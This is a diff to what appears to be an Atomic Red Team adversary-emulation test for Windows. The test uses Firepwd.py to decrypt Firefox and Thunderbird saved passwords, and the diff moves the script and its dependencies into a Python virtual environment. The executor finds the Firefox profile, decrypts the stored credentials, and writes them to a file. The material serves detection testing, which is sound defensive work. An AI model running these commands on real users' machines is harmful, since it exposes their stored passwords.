@@ -200,13 +200,15 @@ atomic_tests:
   description: |
     Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.
     Upon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. 
+
+    Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
   supported_platforms:
   - windows
   input_arguments:
     Firepwd_Path:
       description: Filepath for Firepwd.py
       type: string
-      default: PathToAtomicsFolder\..\ExternalPayloads\Firepwd.py
+      default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py
     Out_Filepath:
       description: Filepath to output results to
       type: string
@@ -219,15 +221,12 @@ atomic_tests:
       description: Filepath to python
       type: string
       default: C:\Program Files\Python310\python.exe
+    venv_path:
+      description: Path to the folder for the tactics venv
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004
   dependency_executor_name: powershell
   dependencies:
-  - description: |
-      Firepwd must exist at #{Firepwd_Path}
-    prereq_command: |
-      if (Test-Path "#{Firepwd_Path}") {exit 0} else {exit 1}
-    get_prereq_command: |
-      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
-      Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}"
   - description: |
       Firefox profile directory must be present
     prereq_command: |
@@ -257,37 +256,35 @@ atomic_tests:
       invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
       Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
   - description: |
-      Pip must be installed.
+      Computer must have venv configured at #{venv_path}
     prereq_command: |
-      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
-      if (pip -v) {exit 0} else {exit 1}
+      if (Test-Path -Path "#{venv_path}") { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      py -m venv "#{venv_path}"
+  - description: |
+      Firepwd must exist at #{Firepwd_Path}
+    prereq_command: |
+      if (Test-Path "#{Firepwd_Path}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
-      invoke-webrequest "https://bootstrap.pypa.io/ez_setup.py" -outfile "PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py"      
-      invoke-webrequest "https://bootstrap.pypa.io/get-pip.py" -outfile "PathToAtomicsFolder\..\ExternalPayloads\get-pip.py"
-      cmd /c "PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py"
-      cmd /c "PathToAtomicsFolder\..\ExternalPayloads\get-pip.py"
+      Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}"
   - description: |
       Pycryptodome library must be installed 
     prereq_command: |
-      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
-      if (pip show pycryptodome) {exit 0} else {exit 1}
+      if (#{venv_path}\Scripts\pip.exe show pycryptodome) {exit 0} else {exit 1}
     get_prereq_command: |
-      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
-      if (test-path "#{VS_CMD_Path}"){pip install pycryptodome | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq"}
+      if (test-path "#{VS_CMD_Path}"){#{venv_path}\Scripts\pip.exe install pycryptodome | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq"}
   - description: |
       Pyasn1 library must be installed 
     prereq_command: |
-      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
-      if (pip show pyasn1) {exit 0} else {exit 1}
+      if (#{venv_path}\Scripts\pip.exe show pyasn1) {exit 0} else {exit 1}
     get_prereq_command: |
-      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
-      if (test-path "#{VS_CMD_Path}"){pip install pyasn1 | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq."}
+      if (test-path "#{VS_CMD_Path}") & {#{venv_path}\Scripts\pip.exe install pyasn1 | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq."}
   executor:
     name: powershell
     command: |
       $PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
-      cmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
+      cmd /c #{venv_path}\Scripts\python.exe #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
       cat #{Out_Filepath}
     cleanup_command: |
       Remove-Item -Path "#{Out_Filepath}" -erroraction silentlycontinue   
